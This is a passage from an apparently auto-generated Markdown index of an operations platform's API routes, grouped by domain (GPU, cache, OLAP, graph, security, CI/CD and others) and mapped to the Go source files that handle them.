- `/api/v1/search/kibana` — `elk_ops.go`
- `/api/v1/search/kibana/ext` — `elk_ext_ops.go`
- `/api/v1/search/logstash` — `elk_ops.go`
- `/api/v1/search/logstash/ext` — `elk_ext_ops.go`
- `/api/v1/search/opensearch` — `elk_ops.go`
- `/api/v1/search/opensearch/ext` — `elk_ext_ops.go`

### `gpu`（13 条）

- `/api/v1/gpu/anomaly` — `gpu_ext_ops.go`
- `/api/v1/gpu/ascend/driver` — `gpu_ext_ops.go`
- `/api/v1/gpu/ascend/monitor` — `gpu_ext_ops.go`
- `/api/v1/gpu/ascend/power` — `gpu_ext_ops.go`
- `/api/v1/gpu/ascend/virt` — `gpu_ext_ops.go`
- `/api/v1/gpu/cost` — `gpu_ext_ops.go`
- `/api/v1/gpu/cuda` — `gpu_ext_ops.go`
- `/api/v1/gpu/dcgm` — `gpu_ext_ops.go`
- `/api/v1/gpu/driver` — `gpu_ext_ops.go`
- `/api/v1/gpu/mig` — `gpu_ext_ops.go`
- `/api/v1/gpu/node-mgmt` — `gpu_ext_ops.go`
- `/api/v1/gpu/power` — `gpu_ext_ops.go`
- `/api/v1/gpu/topology` — `gpu_ext_ops.go`

### `cache`（12 条）

- `/api/v1/cache/deploy` — `cache_ops.go`
- `/api/v1/cache/ignite` — `cache_ops.go`
- `/api/v1/cache/lifecycle` — `cache_ops.go`
- `/api/v1/cache/memcached` — `cache_ops.go`
- `/api/v1/cache/redis/backup` — `cache_ops.go`
- `/api/v1/cache/redis/cluster` — `cache_ops.go`
- `/api/v1/cache/redis/monitor` — `cache_ops.go`
- `/api/v1/cache/redis/persistence` — `cache_ops.go`
- `/api/v1/cache/redis/scenario` — `redis_cache_ops.go`
- `/api/v1/cache/redis/security` — `cache_ops.go`
- `/api/v1/cache/redis/sentinel` — `cache_ops.go`
- `/api/v1/cache/redis/tuning` — `cache_ops.go`

### `olap`（10 条）

- `/api/v1/olap/clickhouse` — `olap_ext_ops.go`
- `/api/v1/olap/clickhouse/materialized-view` — `olap_ext_ops.go`
- `/api/v1/olap/doris/backup` — `olap_ext_ops.go`
- `/api/v1/olap/doris/be` — `olap_ext_ops.go`
- `/api/v1/olap/doris/fe` — `olap_ext_ops.go`
- `/api/v1/olap/doris/materialized-view` — `olap_ext_ops.go`
- `/api/v1/olap/doris/monitor` — `olap_ext_ops.go`
- `/api/v1/olap/doris/upgrade` — `olap_ext_ops.go`
- `/api/v1/olap/doris/user` — `olap_ext_ops.go`
- `/api/v1/olap/trino` — `olap_ext_ops.go`

### `graph`（7 条）

- `/api/v1/graph/backup-ext` — `graph_ext_ops.go`
- `/api/v1/graph/index` — `graph_ext_ops.go`
- `/api/v1/graph/monitor` — `graph_ext_ops.go`
- `/api/v1/graph/scale` — `graph_ext_ops.go`
- `/api/v1/graph/schema` — `graph_ext_ops.go`
- `/api/v1/graph/upgrade` — `graph_ext_ops.go`
- `/api/v1/graph/user` — `graph_ext_ops.go`

### `security`（6 条）

- `/api/v1/security/cert` — `security_ext_ops.go`
- `/api/v1/security/ddos` — `security_ext_ops.go`
- `/api/v1/security/hardening` — `security_ext_ops.go`
- `/api/v1/security/injection` — `security_ext_ops.go`
- `/api/v1/security/vuln-scan` — `security_ext_ops.go`
- `/api/v1/security/waf` — `security_ext_ops.go`

### `db`（5 条）

- `/api/v1/db/backup` — `db_backup_ops.go`
- `/api/v1/db/domestic` — `domestic_ops.go`
- `/api/v1/db/gaussdb` — `domestic_ops.go`
- `/api/v1/db/perf` — `db_perf_ops.go`
- `/api/v1/db/replication` — `db_replication_ops.go`

### `vector`（5 条）

- `/api/v1/vector/backup` — `vector_ext_ops.go`
- `/api/v1/vector/monitor` — `vector_ext_ops.go`
- `/api/v1/vector/scale` — `vector_ext_ops.go`
- `/api/v1/vector/upgrade` — `vector_ext_ops.go`
- `/api/v1/vector/user` — `vector_ext_ops.go`

### `cicd`（4 条）

- `/api/v1/cicd/github-actions` — `cicd_ops.go`
- `/api/v1/cicd/gitlab` — `cicd_ops.go`
- `/api/v1/cicd/jenkins` — `cicd_ops.go`
- `/api/v1/cicd/tekton` — `cicd_ops.go`

### `data`（3 条）

- `/api/v1/data/lake` — `data_ops.go`
- `/api/v1/data/pipeline` — `data_ops.go`
- `/api/v1/data/warehouse` — `data_ops.go`

### `script`（3 条）

- `/api/v1/script/compile` — `script_compile_ops.go`
- `/api/v1/script/exec` — `script_compile_ops.go`
- `/api/v1/script/template` — `script_compile_ops.go`

### `container`（2 条）

- `/api/v1/container` — `container_ops.go`
- `/api/v1/container/image` — `container_ops.go`

### `storage`（2 条）

- `/api/v1/storage/distfs` — `distfs_ops.go`
- `/api/v1/storage/fastdfs` — `storage_fastdfs.go`

### `abac`（1 条）

- `/api/v1/abac` — `abac_ops.go`

### `auth`（1 条）

- `/api/v1/auth/oauth` — `kafka_advanced_ops.go`

### `automation`（1 条）

- `/api/v1/automation` — `automation_ops.go`

### `build`（1 条）

- `/api/v1/build/tool` — `script_compile_ops.go`

### `capacity`（1 条）

- `/api/v1/capacity` — `capacity_ops.go`

### `gateway`（1 条）

- `/api/v1/gateway/mgmt` — `gateway_mgmt_ops.go`

### `ha`（1 条）

- `/api/v1/ha` — `ha_ops.go`

### `iac`（1 条）

- `/api/v1/iac` — `iac_ops.go`

### `identity`（1 条）

- `/api/v1/identity` — `identity_ops.go`

### `k8s`（1 条）

- `/api/v1/k8s/gateway-api` — `k8s_gateway_ops.go`

### `microservice`（1 条）

- `/api/v1/microservice` — `microservice_ops.go`

### `netdiag`（1 条）

- `/api/v1/netdiag` — `netdiag_ops.go`

### `network`（1 条）

- `/api/v1/network/ext` — `network_ext_ops.go`

### `observability`（1 条）

- `/api/v1/observability` — `observability_ops.go`

### `oncall`（1 条）

- `/api/v1/oncall` — `oncall_ops.go`

### `servicediscovery`（1 条）

- `/api/v1/servicediscovery` — `servicediscovery_ops.go`

### `servicemesh`（1 条）

- `/api/v1/servicemesh` — `servicemesh_ops.go`

### `statuspage`（1 条）

- `/api/v1/statuspage` — `statuspage_ops.go`

### `synthetic`（1 条）

- `/api/v1/synthetic` — `synthetic_ops.go`


